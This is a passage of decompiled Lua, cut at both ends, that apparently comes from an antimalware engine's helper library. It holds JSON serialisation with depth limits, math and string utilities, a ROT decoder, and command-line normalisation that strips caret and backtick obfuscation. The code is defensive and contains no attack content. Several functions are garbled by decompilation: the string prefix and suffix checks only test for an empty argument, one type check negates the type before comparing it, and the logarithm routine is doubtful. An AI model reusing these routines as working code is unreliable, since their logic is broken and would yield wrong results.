          L17_2 = L17_2(L18_2)
          if L17_2 == nil then
            L17_2 = L4_2
            L18_2 = "}"
            L4_2 = L17_2 .. L18_2
        end
        else
          L17_2 = L4_2
          L18_2 = L5_2
          L19_2 = L17_1
          L20_2 = L16_2
          L21_2 = A1_2
          L22_2 = A2_2
          L23_2 = A3_2 + 1
          L19_2 = L19_2(L20_2, L21_2, L22_2, L23_2)
          L4_2 = L17_2 .. L18_2 .. L19_2
        end
      else
        L17_2 = L4_2
        L18_2 = L5_2
        L19_2 = L16_1
        L20_2 = L16_2
        L19_2 = L19_2(L20_2)
        L4_2 = L17_2 .. L18_2 .. L19_2
      end
    end
    L12_2 = L4_2
    L13_2 = L5_2
    L14_2 = L9_2
    L15_2 = "]"
    L4_2 = L12_2 .. L13_2 .. L14_2 .. L15_2
    goto lbl_274
    ::lbl_148::
    if A3_2 == 0 then
      L12_2 = L4_2
      L13_2 = L7_2
      L14_2 = "{"
      L15_2 = L5_2
      L4_2 = L12_2 .. L13_2 .. L14_2 .. L15_2
    end
    L12_2 = pairs
    L13_2 = A0_2
    L12_2, L13_2, L14_2 = L12_2(L13_2)
    for L15_2, L16_2 in L12_2, L13_2, L14_2 do
      if 0 < L10_2 then
        L17_2 = L4_2
        L18_2 = ","
        L19_2 = L5_2
        L4_2 = L17_2 .. L18_2 .. L19_2
      end
      L10_2 = L10_2 + 1
      L17_2 = type
      L18_2 = L16_2
      L17_2 = L17_2(L18_2)
      if L17_2 == "table" then
        L17_2 = rawget
        L18_2 = L16_2
        L19_2 = 1
        L17_2 = L17_2(L18_2, L19_2)
        if L17_2 == nil then
          L17_2 = next
          L18_2 = L16_2
          L17_2 = L17_2(L18_2)
          if L17_2 ~= nil then
            goto lbl_202
          end
        end
        L17_2 = L4_2
        L18_2 = string
        L18_2 = L18_2.format
        if A1_2 then
          L19_2 = "%s%s:["
          if L19_2 then
            goto lbl_191
          end
        end
        L19_2 = "%s%s: ["
        ::lbl_191::
        L20_2 = L7_2
        L21_2 = L10_1
        L22_2 = L16_1
        L23_2 = L15_2
        L22_2 = L22_2(L23_2)
        L23_2 = L11_2
        L21_2, L22_2, L23_2 = L21_2(L22_2, L23_2)
        L18_2 = L18_2(L19_2, L20_2, L21_2, L22_2, L23_2)
        L19_2 = L5_2
        L4_2 = L17_2 .. L18_2 .. L19_2
        goto lbl_221
        ::lbl_202::
        L17_2 = L4_2
        L18_2 = string
        L18_2 = L18_2.format
        if A1_2 then
          L19_2 = "%s%s:{"
          if L19_2 then
            goto lbl_211
          end
        end
        L19_2 = "%s%s: {"
        ::lbl_211::
        L20_2 = L7_2
        L21_2 = L10_1
        L22_2 = L16_1
        L23_2 = L15_2
        L22_2 = L22_2(L23_2)
        L23_2 = L11_2
        L21_2, L22_2, L23_2 = L21_2(L22_2, L23_2)
        L18_2 = L18_2(L19_2, L20_2, L21_2, L22_2, L23_2)
        L19_2 = L5_2
        L4_2 = L17_2 .. L18_2 .. L19_2
        ::lbl_221::
        L17_2 = L4_2
        L18_2 = L17_1
        L19_2 = L16_2
        L20_2 = A1_2
        L21_2 = A2_2
        L22_2 = A3_2 + 1
        L18_2 = L18_2(L19_2, L20_2, L21_2, L22_2)
        L4_2 = L17_2 .. L18_2
      else
        L17_2 = L4_2
        L18_2 = string
        L18_2 = L18_2.format
        if A1_2 then
          L19_2 = "%s%s:%s"
          if L19_2 then
            goto lbl_239
          end
        end
        L19_2 = "%s%s: %s"
        ::lbl_239::
        L20_2 = L7_2
        L21_2 = L10_1
        L22_2 = L16_1
        L23_2 = L15_2
        L22_2 = L22_2(L23_2)
        L23_2 = L11_2
        L21_2 = L21_2(L22_2, L23_2)
        L22_2 = L16_1
        L23_2 = L16_2
        L22_2, L23_2 = L22_2(L23_2)
        L18_2 = L18_2(L19_2, L20_2, L21_2, L22_2, L23_2)
        L4_2 = L17_2 .. L18_2
      end
    end
    if not L10_2 then
      L12_2 = L4_2
      L13_2 = "/* empty table */"
      L14_2 = L5_2
      L4_2 = L12_2 .. L13_2 .. L14_2
    else
      L12_2 = L4_2
      L13_2 = L5_2
      L4_2 = L12_2 .. L13_2
    end
    L12_2 = L4_2
    L13_2 = L9_2
    L14_2 = "}"
    L4_2 = L12_2 .. L13_2 .. L14_2
  else
    L7_2 = L4_2
    L8_2 = L16_1
    L9_2 = A0_2
    L8_2 = L8_2(L9_2)
    L9_2 = L5_2
    L4_2 = L7_2 .. L8_2 .. L9_2
  end
  ::lbl_274::
  return L4_2
end

function L18_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2
  if A1_2 == nil then
    A1_2 = true
  end
  L2_2 = L17_1
  L3_2 = A0_2
  L4_2 = A1_2
  L2_2 = L2_2(L3_2, L4_2)
  return L2_2
end

function L19_1(A0_2, A1_2, A2_2, A3_2)
  local L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2
  if not A3_2 then
    A3_2 = 0
  end
  if 260 < A2_2 then
    A2_2 = 260
  end
  if 8 < A1_2 then
    A1_2 = 8
  end
  if A3_2 > A1_2 then
    L4_2 = false
    L5_2 = "MaxNestingDepthExceeded"
    return L4_2, L5_2
  end
  L4_2 = 0
  L5_2 = pairs
  L6_2 = A0_2
  L5_2, L6_2, L7_2 = L5_2(L6_2)
  for L8_2, L9_2 in L5_2, L6_2, L7_2 do
    L4_2 = L4_2 + 1
    if A2_2 < L4_2 then
      L10_2 = false
      L11_2 = "JsonMaxElementsPerLevelExceeded"
      return L10_2, L11_2
    end
    L10_2 = type
    L11_2 = L9_2
    L10_2 = L10_2(L11_2)
    if L10_2 == "table" then
      L10_2 = pcall
      L11_2 = L19_1
      L12_2 = L9_2
      L13_2 = A1_2
      L14_2 = A2_2
      L15_2 = A3_2 + 1
      L10_2, L11_2, L12_2 = L10_2(L11_2, L12_2, L13_2, L14_2, L15_2)
      if not L10_2 or not L11_2 then
        L13_2 = false
        L14_2 = tostring
        L15_2 = L12_2
        L14_2 = L14_2(L15_2)
        L15_2 = "_"
        L16_2 = tostring
        L17_2 = L11_2
        L16_2 = L16_2(L17_2)
        L14_2 = L14_2 .. L15_2 .. L16_2
        return L13_2, L14_2
      end
    end
  end
  L5_2 = true
  return L5_2
end

function L20_1(A0_2, A1_2, A2_2, A3_2)
  local L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2
  if A0_2 then
    L4_2 = type
    L5_2 = A0_2
    L4_2 = L4_2(L5_2)
    L4_2 = not L4_2
    if L4_2 ~= "table" then
      goto lbl_11
    end
  end
  L4_2 = nil
  do return L4_2 end
  ::lbl_11::
  L4_2 = pcall
  L5_2 = L19_1
  L6_2 = A0_2
  L7_2 = A2_2 or L7_2
  if not A2_2 then
    L7_2 = 8
  end
  L8_2 = A1_2 or L8_2
  if not A1_2 then
    L8_2 = 50
  end
  L4_2, L5_2, L6_2 = L4_2(L5_2, L6_2, L7_2, L8_2)
  if not L4_2 or not L5_2 then
    L7_2 = "LuaCheckError_"
    L8_2 = tostring
    L9_2 = L6_2
    L8_2 = L8_2(L9_2)
    L9_2 = "_"
    L10_2 = #A0_2
    L11_2 = "_"
    L12_2 = tostring
    L13_2 = L5_2
    L12_2 = L12_2(L13_2)
    L7_2 = L7_2 .. L8_2 .. L9_2 .. L10_2 .. L11_2 .. L12_2
    L8_2 = bm
    if L8_2 then
      L8_2 = bm
      L8_2 = L8_2.add_related_string
      L9_2 = "SafeJsonSerializeFailReason"
      L10_2 = L7_2
      L11_2 = bm
      L11_2 = L11_2.RelatedStringBMReport
      L8_2(L9_2, L10_2, L11_2)
    end
    if A3_2 then
      L8_2 = nil
      L9_2 = L7_2
      return L8_2, L9_2
    else
      L8_2 = nil
      return L8_2
    end
  end
  L7_2 = nil
  L8_2 = nil
  L9_2 = pcall
  L10_2 = MpCommon
  L10_2 = L10_2.JsonSerialize
  L11_2 = A0_2
  L9_2, L10_2 = L9_2(L10_2, L11_2)
  if not L9_2 then
    L7_2 = L10_2
    L11_2 = bm
    if L11_2 then
      L11_2 = bm
      L11_2 = L11_2.add_related_string
      L12_2 = "LuaSerialization"
      L13_2 = "true"
      L14_2 = bm
      L14_2 = L14_2.RelatedStringBMReport
      L11_2(L12_2, L13_2, L14_2)
      L11_2 = bm
      L11_2 = L11_2.add_related_string
      L12_2 = "EngineSafeJsonSerializeFailReason"
      L13_2 = tostring
      L14_2 = L10_2
      L13_2 = L13_2(L14_2)
      L14_2 = bm
      L14_2 = L14_2.RelatedStringBMReport
      L11_2(L12_2, L13_2, L14_2)
    end
    L11_2 = pcall
    L12_2 = L17_1
    L13_2 = A0_2
    L14_2 = true
    L11_2, L12_2 = L11_2(L12_2, L13_2, L14_2)
    L10_2 = L12_2
    L9_2 = L11_2
    L11_2 = bm
    if L11_2 and not L9_2 then
      L11_2 = bm
      L11_2 = L11_2.add_related_string
      L12_2 = "LuaSafeJsonSerializeFailReason"
      L13_2 = tostring
      L14_2 = L10_2
      L13_2 = L13_2(L14_2)
      L14_2 = bm
      L14_2 = L14_2.RelatedStringBMReport
      L11_2(L12_2, L13_2, L14_2)
    end
    if not L9_2 then
      L8_2 = L10_2
    end
  end
  if not L9_2 and A3_2 then
    L11_2 = nil
    L12_2 = tostring
    L13_2 = L7_2
    L12_2 = L12_2(L13_2)
    L13_2 = "_"
    L14_2 = tostring
    L15_2 = L8_2
    L14_2 = L14_2(L15_2)
    L12_2 = L12_2 .. L13_2 .. L14_2
    return L11_2, L12_2
  end
  L11_2 = L10_2 or L11_2
  if not L9_2 or not L10_2 then
    L11_2 = nil
  end
  return L11_2
end

safeJsonSerialize = L20_1

function L20_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = pcall
  L2_2 = MpCommon
  L2_2 = L2_2.JsonDeserialize
  L3_2 = A0_2
  L1_2, L2_2 = L1_2(L2_2, L3_2)
  L3_2 = L2_2 or L3_2
  if not L1_2 or not L2_2 then
    L3_2 = nil
  end
  return L3_2
end

safeJsonDeserialize = L20_1

function L20_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L5_2 = L3_1
  L6_2 = math_floor
  L7_2 = A0_2
  L6_2, L7_2 = L6_2(L7_2)
  L5_2 = L5_2(L6_2, L7_2)
  L1_2 = L5_2
  L5_2 = mp
  L5_2 = L5_2.shl32
  L6_2 = 1
  L7_2 = L1_2
  L5_2 = L5_2(L6_2, L7_2)
  L2_2 = L5_2
  L3_2 = A0_2 / L2_2
  L5_2 = 0 * L3_2
  L5_2 = 0 - L5_2
  L5_2 = L5_2 * L3_2
  L5_2 = -1 + L5_2
  L5_2 = L5_2 * L3_2
  L5_2 = 2 + L5_2
  L5_2 = L5_2 * L3_2
  L4_2 = L5_2 - 1
  L5_2 = L1_2 * 69314718
  L5_2 = L5_2 / 100000000
  L4_2 = L4_2 + L5_2
  return L4_2
end

math_ln = L20_1

function L20_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = math_ln
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  L2_2 = math_ln
  L3_2 = 2
  L2_2 = L2_2(L3_2)
  L1_2 = L1_2 / L2_2
  return L1_2
end

math_log2 = L20_1

function L20_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  L2_2 = 1
  L3_2 = 1
  L4_2 = A1_2
  L5_2 = 1
  for L6_2 = L3_2, L4_2, L5_2 do
    L2_2 = L2_2 * A0_2
  end
  return L2_2
end

math_pow = L20_1

function L20_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L2_2 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
  L3_2 = ""
  while 0 < A0_2 do
    L4_2 = string
    L4_2 = L4_2.char
    L5_2 = string
    L5_2 = L5_2.byte
    L6_2 = L2_2
    L7_2 = A0_2 % A1_2
    L7_2 = L7_2 + 1
    L5_2, L6_2, L7_2 = L5_2(L6_2, L7_2)
    L4_2 = L4_2(L5_2, L6_2, L7_2)
    L5_2 = L3_2
    L3_2 = L4_2 .. L5_2
    L4_2 = math_floor
    L5_2 = A0_2 / A1_2
    L4_2 = L4_2(L5_2)
    A0_2 = L4_2
  end
  return L3_2
end

math_base = L20_1

function L20_1(A0_2)
  local L1_2
  if A0_2 < 0 then
    L1_2 = -A0_2
    return L1_2
  else
    return A0_2
  end
end

math_abs = L20_1

function L20_1(...)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2
  L1_2 = arg[1]
  L2_2 = 2
  L3_2 = #arg
  L4_2 = 1
  for L5_2 = L2_2, L3_2, L4_2 do
    L6_2 = arg[L5_2]
    if L1_2 < L6_2 then
      L1_2 = arg[L5_2]
    end
  end
  return L1_2
end

math_max = L20_1

function L20_1(...)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2
  L1_2 = arg[1]
  L2_2 = 2
  L3_2 = #arg
  L4_2 = 1
  for L5_2 = L2_2, L3_2, L4_2 do
    L6_2 = arg[L5_2]
    if L1_2 > L6_2 then
      L1_2 = arg[L5_2]
    end
  end
  return L1_2
end

math_min = L20_1

function L20_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = tonumber
  L2_2 = string
  L2_2 = L2_2.format
  L3_2 = "%.f"
  L4_2 = A0_2
  L2_2, L3_2, L4_2 = L2_2(L3_2, L4_2)
  L1_2 = L1_2(L2_2, L3_2, L4_2)
  if A0_2 < L1_2 then
    L1_2 = L1_2 - 1
  end
  return L1_2
end

math_floor = L20_1

function L20_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  if not A1_2 then
    A1_2 = 0
  end
  L2_2 = tonumber
  L3_2 = string
  L3_2 = L3_2.format
  L4_2 = "%."
  L5_2 = A1_2
  L6_2 = "f"
  L4_2 = L4_2 .. L5_2 .. L6_2
  L5_2 = A0_2
  L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2, L5_2)
  return L2_2(L3_2, L4_2, L5_2, L6_2)
end

math_round = L20_1

function L20_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L2_2 = A0_2
  L1_2 = A0_2.gsub
  L3_2 = "."
  
  function L4_2(A0_3)
    local L1_3, L2_3, L3_3, L4_3
    L1_3 = string
    L1_3 = L1_3.format
    L2_3 = "%02X"
    L3_3 = string
    L3_3 = L3_3.byte
    L4_3 = A0_3
    L3_3, L4_3 = L3_3(L4_3)
    return L1_3(L2_3, L3_3, L4_3)
  end
  
  L1_2 = L1_2(L2_2, L3_2, L4_2)
  return L1_2
end

tohex = L20_1

function L20_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  if not A1_2 then
    A1_2 = 13
  end
  L2_2 = {}
  L3_2 = 1
  L4_2 = #A0_2
  L5_2 = 1
  for L6_2 = L3_2, L4_2, L5_2 do
    L8_2 = A0_2
    L7_2 = A0_2.byte
    L9_2 = L6_2
    L7_2 = L7_2(L8_2, L9_2)
    if 65 <= L7_2 and L7_2 <= 90 then
      L8_2 = L7_2 - 65
      L8_2 = L8_2 + A1_2
      L8_2 = L8_2 % 26
      L7_2 = L8_2 + 65
    elseif 97 <= L7_2 and L7_2 <= 122 then
      L8_2 = L7_2 - 97
      L8_2 = L8_2 + A1_2
      L8_2 = L8_2 % 26
      L7_2 = L8_2 + 97
    end
    L8_2 = #L2_2
    L8_2 = L8_2 + 1
    L9_2 = string
    L9_2 = L9_2.char
    L10_2 = L7_2
    L9_2 = L9_2(L10_2)
    L2_2[L8_2] = L9_2
  end
  L3_2 = table
  L3_2 = L3_2.concat
  L4_2 = L2_2
  return L3_2(L4_2)
end

rot_decrypt = L20_1

function L20_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L2_2 = L4_1
  L3_2 = math_pow
  L4_2 = math_abs
  L5_2 = A0_2[1]
  L6_2 = A1_2[1]
  L5_2 = L5_2 - L6_2
  L4_2 = L4_2(L5_2)
  L5_2 = 2
  L3_2 = L3_2(L4_2, L5_2)
  L4_2 = math_pow
  L5_2 = math_abs
  L6_2 = A0_2[2]
  L7_2 = A1_2[2]
  L6_2 = L6_2 - L7_2
  L5_2 = L5_2(L6_2)
  L6_2 = 2
  L4_2 = L4_2(L5_2, L6_2)
  L3_2 = L3_2 + L4_2
  L2_2 = L2_2(L3_2)
  return L2_2
end

euclideanDistance = L20_1

function L20_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L3_2 = -1
  L4_2 = 0
  L5_2 = 0
  repeat
    L6_2 = string
    L6_2 = L6_2.find
    L7_2 = A0_2
    L8_2 = A1_2
    L9_2 = L5_2 + 1
    L10_2 = true
    L6_2, L7_2 = L6_2(L7_2, L8_2, L9_2, L10_2)
    L5_2 = L7_2
    L4_2 = L6_2
    if L4_2 and A2_2 <= L4_2 then
      break
    end
    L3_2 = L4_2
  until L4_2 == nil
  return L3_2
end

lastIndexOf = L20_1

function L20_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  if not A0_2 then
    return A2_2
  end
  L3_2 = type
  L4_2 = A2_2
  L3_2 = L3_2(L4_2)
  if L3_2 ~= "table" then
    L3_2 = {}
    A2_2 = L3_2
  end
  L3_2 = 1
  while true do
    L4_2 = string
    L4_2 = L4_2.find
    L5_2 = A0_2
    L6_2 = A1_2
    L7_2 = L3_2
    L8_2 = true
    L4_2, L5_2 = L4_2(L5_2, L6_2, L7_2, L8_2)
    if not L4_2 then
      L6_2 = string
      L6_2 = L6_2.sub
      L7_2 = A0_2
      L8_2 = L3_2
      L6_2 = L6_2(L7_2, L8_2)
      L7_2 = tonumber
      L8_2 = L6_2
      L7_2 = L7_2(L8_2)
      L8_2 = #A2_2
      L8_2 = L8_2 + 1
      L9_2 = L7_2 or L9_2
      if not L7_2 then
        L9_2 = L6_2
      end
      A2_2[L8_2] = L9_2
      break
    end
    L6_2 = string
    L6_2 = L6_2.sub
    L7_2 = A0_2
    L8_2 = L3_2
    L9_2 = L4_2 - 1
    L6_2 = L6_2(L7_2, L8_2, L9_2)
    L7_2 = tonumber
    L8_2 = L6_2
    L7_2 = L7_2(L8_2)
    L8_2 = #A2_2
    L8_2 = L8_2 + 1
    L9_2 = L7_2 or L9_2
    if not L7_2 then
      L9_2 = L6_2
    end
    A2_2[L8_2] = L9_2
    L3_2 = L5_2 + 1
  end
  return A2_2
end

split = L20_1

function L20_1(A0_2, A1_2, A2_2, A3_2)
  local L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  if not A0_2 then
    return A2_2
  end
  L4_2 = type
  L5_2 = A2_2
  L4_2 = L4_2(L5_2)
  if L4_2 ~= "table" then
    L4_2 = {}
    A2_2 = L4_2
  end
  L4_2 = string
  L4_2 = L4_2.find
  L5_2 = A0_2
  L6_2 = A1_2
  L4_2, L5_2 = L4_2(L5_2, L6_2)
  L6_2 = string
  L6_2 = L6_2.sub
  L7_2 = A0_2
  L8_2 = 1
  L9_2 = L4_2 - 1
  L6_2 = L6_2(L7_2, L8_2, L9_2)
  L7_2 = string
  L7_2 = L7_2.sub
  L8_2 = A0_2
  L9_2 = L5_2 + 1
  L7_2 = L7_2(L8_2, L9_2)
  L8_2 = tonumber
  L9_2 = L7_2
  L8_2 = L8_2(L9_2)
  if L8_2 then
    L7_2 = L8_2
  end
  if A3_2 then
    L9_2 = A3_2
    L10_2 = L6_2
    L11_2 = L7_2
    L9_2 = L9_2(L10_2, L11_2)
    L7_2 = L9_2
  end
  A2_2[L6_2] = L7_2
  return A2_2
end

kvsplit = L20_1

function L20_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2
  L2_2 = str_split
  L3_2 = A0_2
  L4_2 = A1_2
  return L2_2(L3_2, L4_2)
end

explode = L20_1

function L20_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L2_2 = {}
  L3_2 = string
  L3_2 = L3_2.format
  L4_2 = "[%s]"
  L5_2 = A1_2 or L5_2
  if not A1_2 then
    L5_2 = "%s"
  end
  L3_2 = L3_2(L4_2, L5_2)
  L4_2 = 1
  while true do
    L6_2 = A0_2
    L5_2 = A0_2.find
    L7_2 = L3_2
    L8_2 = L4_2
    L5_2 = L5_2(L6_2, L7_2, L8_2)
    if not L5_2 then
      L6_2 = #L2_2
      L6_2 = L6_2 + 1
      L8_2 = A0_2
      L7_2 = A0_2.sub
      L9_2 = L4_2
      L7_2 = L7_2(L8_2, L9_2)
      L2_2[L6_2] = L7_2
      break
    end
    L6_2 = #L2_2
    L6_2 = L6_2 + 1
    L8_2 = A0_2
    L7_2 = A0_2.sub
    L9_2 = L4_2
    L10_2 = L5_2 - 1
    L7_2 = L7_2(L8_2, L9_2, L10_2)
    L2_2[L6_2] = L7_2
    L4_2 = L5_2 + 1
  end
  return L2_2
end

str_split = L20_1

function L20_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2
  if not A0_2 or not A1_2 then
    L2_2 = false
    return L2_2
  end
  L2_2 = #A1_2
  L3_2 = #A0_2
  if L2_2 > L3_2 then
    L2_2 = false
    return L2_2
  end
  L2_2 = A1_2 == ""
  return L2_2
end

StringEndsWith = L20_1

function L20_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  L2_2 = A1_2 == ""
  return L2_2
end

StringStartsWith = L20_1

function L20_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  if A1_2 == nil then
    A1_2 = "%s"
  end
  L2_2 = {}
  L3_2 = string
  L3_2 = L3_2.gmatch
  L4_2 = A0_2
  L5_2 = "([^"
  L6_2 = A1_2
  L7_2 = "]+)"
  L5_2 = L5_2 .. L6_2 .. L7_2
  L3_2, L4_2, L5_2 = L3_2(L4_2, L5_2)
  for L6_2 in L3_2, L4_2, L5_2 do
    L7_2 = table
    L7_2 = L7_2.insert
    L8_2 = L2_2
    L9_2 = L6_2
    L7_2(L8_2, L9_2)
  end
  return L2_2
end

StringSplit = L20_1

function L20_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2
  if not A1_2 then
    A1_2 = " "
  end
  L2_2 = L6_1
  L3_2 = L5_1
  L4_2 = A0_2
  L5_2 = A1_2
  L3_2 = L3_2(L4_2, L5_2)
  L4_2 = A1_2
  return L2_2(L3_2, L4_2)
end

trim = L20_1

function L20_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L1_2 = false
  L2_2 = pairs
  L3_2 = A0_2
  L2_2, L3_2, L4_2 = L2_2(L3_2)
  for L5_2, L6_2 in L2_2, L3_2, L4_2 do
    L7_2 = string
    L7_2 = L7_2.match
    L8_2 = L5_2
    L9_2 = "^[%w_]+$"
    L7_2 = L7_2(L8_2, L9_2)
    if not L7_2 then
      L1_2 = true
      break
    end
  end
  return L1_2
end

function L21_1(A0_2)
  local L1_2, L2_2
  L1_2 = string
  L1_2 = L1_2.reverse
  L2_2 = A0_2
  return L1_2(L2_2)
end

str_reverse = L21_1

function L21_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L2_2 = type
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if L2_2 ~= "string" then
    L2_2 = 0
    return L2_2
  end
  L2_2 = type
  L3_2 = A1_2
  L2_2 = L2_2(L3_2)
  if L2_2 ~= "table" then
    L2_2 = 0
    return L2_2
  end
  L2_2 = 0
  L3_2 = ipairs
  L4_2 = A1_2
  L3_2, L4_2, L5_2 = L3_2(L4_2)
  for L6_2, L7_2 in L3_2, L4_2, L5_2 do
    L8_2 = type
    L9_2 = L7_2
    L8_2 = L8_2(L9_2)
    if L8_2 == "string" then
      L9_2 = A0_2
      L8_2 = A0_2.find
      L10_2 = L7_2
      L8_2 = L8_2(L9_2, L10_2)
      if L8_2 then
        L2_2 = L2_2 + 1
      end
    end
  end
  return L2_2
end

str_count_match = L21_1

function L21_1(A0_2, A1_2, ...)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  
  function L3_2(A0_3, A1_3)
    local L2_3, L3_3, L4_3, L5_3
    if not A1_3 then
      A1_3 = 1
    end
    L2_3 = A0_3[A1_3]
    if L2_3 ~= nil then
      L2_3 = A0_3[A1_3]
      L3_3 = L3_2
      L4_3 = A0_3
      L5_3 = A1_3 + 1
      L3_3, L4_3, L5_3 = L3_3(L4_3, L5_3)
      return L2_3, L3_3, L4_3, L5_3
    end
  end
  
  L4_2 = {}
  L5_2 = pcall
  L6_2 = A1_2
  L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2 = ...
  L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2 = L5_2(L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2)
  L4_2[1] = L5_2
  L4_2[2] = L6_2
  L4_2[3] = L7_2
  L4_2[4] = L8_2
  L4_2[5] = L9_2
  L4_2[6] = L10_2
  L4_2[7] = L11_2
  L4_2[8] = L12_2
  L4_2[9] = L13_2
  L5_2 = L4_2[1]
  if not L5_2 then
    L5_2 = "LuaError"
    L6_2 = A0_2
    L7_2 = ":"
    L8_2 = L4_2[2]
    L6_2 = L6_2 .. L7_2 .. L8_2
    L7_2 = AppendToRollingQueue
    L8_2 = L5_2
    L9_2 = L6_2
    L10_2 = 0
    L11_2 = 60
    L12_2 = 32
    L13_2 = 1
    L7_2(L8_2, L9_2, L10_2, L11_2, L12_2, L13_2)
  end
  L5_2 = L3_2
  L6_2 = L4_2
  return L5_2(L6_2)
end

pcallEx = L21_1

function L21_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = pcall
  L2_2 = MpCommon
  L2_2 = L2_2.RollingQueueQuery
  L3_2 = A0_2
  L1_2, L2_2 = L1_2(L2_2, L3_2)
  if L1_2 then
    return L2_2
  end
  L3_2 = nil
  return L3_2
end

GetRollingQueue = L21_1

function L21_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = type
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if L1_2 ~= "string" or A0_2 == "" then
    L1_2 = ""
    return L1_2
  end
  L1_2 = string
  L1_2 = L1_2.gsub
  L2_2 = A0_2
  L3_2 = "%^"
  L4_2 = ""
  L1_2 = L1_2(L2_2, L3_2, L4_2)
  A0_2 = L1_2
  L1_2 = string
  L1_2 = L1_2.gsub
  L2_2 = A0_2
  L3_2 = "`"
  L4_2 = ""
  L1_2 = L1_2(L2_2, L3_2, L4_2)
  A0_2 = L1_2
  L1_2 = string
  L1_2 = L1_2.find
  L2_2 = A0_2
  L3_2 = "%"
  L4_2 = 1
  L5_2 = true
  L1_2 = L1_2(L2_2, L3_2, L4_2, L5_2)
  if L1_2 then
    L1_2 = pcall
    L2_2 = mp
    L2_2 = L2_2.ContextualExpandEnvironmentVariables
    L3_2 = A0_2
    L1_2, L2_2 = L1_2(L2_2, L3_2)
    if L1_2 then
      L3_2 = type
      L4_2 = L2_2
      L3_2 = L3_2(L4_2)
      if L3_2 == "string" and L2_2 ~= "" then
        A0_2 = L2_2
      end
    end
  end
  L1_2 = string
  L1_2 = L1_2.lower
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  A0_2 = L1_2
  L1_2 = string
  L1_2 = L1_2.gsub
  L2_2 = A0_2
  L3_2 = "%s+"
  L4_2 = " "
  L1_2 = L1_2(L2_2, L3_2, L4_2)
  A0_2 = L1_2
  L1_2 = string
  L1_2 = L1_2.gsub
  L2_2 = A0_2
  L3_2 = "^ "
  L4_2 = ""
  L1_2 = L1_2(L2_2, L3_2, L4_2)
  A0_2 = L1_2
  L1_2 = string
  L1_2 = L1_2.gsub
  L2_2 = A0_2
  L3_2 = " $"
  L4_2 = ""
  L1_2 = L1_2(L2_2, L3_2, L4_2)
  A0_2 = L1_2
  return A0_2
end

function L22_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L4_2 = string
  L4_2 = L4_2.gmatch
  L5_2 = A0_2
  L6_2 = "%S+"
  L4_2, L5_2, L6_2 = L4_2(L5_2, L6_2)
  for L7_2 in L4_2, L5_2, L6_2 do
    if L3_2 ~= nil then
      L8_2 = #L7_2
      L9_2 = #L3_2
      if not (L8_2 > L9_2) then
        goto lbl_14
      end
    end
    L3_2 = L7_2
    ::lbl_14::
  end
  if L3_2 ~= nil then
    L4_2 = #L3_2
    if not (A1_2 > L4_2) then
      goto lbl_23
    end
  end
  L4_2 = nil
  do return L4_2 end
  ::lbl_23::
  L4_2 = #L3_2
  if A2_2 <= L4_2 then
    return L3_2
  end
  L4_2 = string
  L4_2 = L4_2.find
  L5_2 = L3_2
  L6_2 = "://"
  L7_2 = 1
  L8_2 = true
  L4_2 = L4_2(L5_2, L6_2, L7_2, L8_2)
  if L4_2 then
    return L3_2
  end
  L4_2 = string
  L4_2 = L4_2.find
  L5_2 = L3_2
  L6_2 = "\\"
  L7_2 = 1
  L8_2 = true
  L4_2 = L4_2(L5_2, L6_2, L7_2, L8_2)
  if L4_2 then
    return L3_2
  end
  L4_2 = nil
  return L4_2
end

function L23_1(A0_2, A1_2, A2_2)
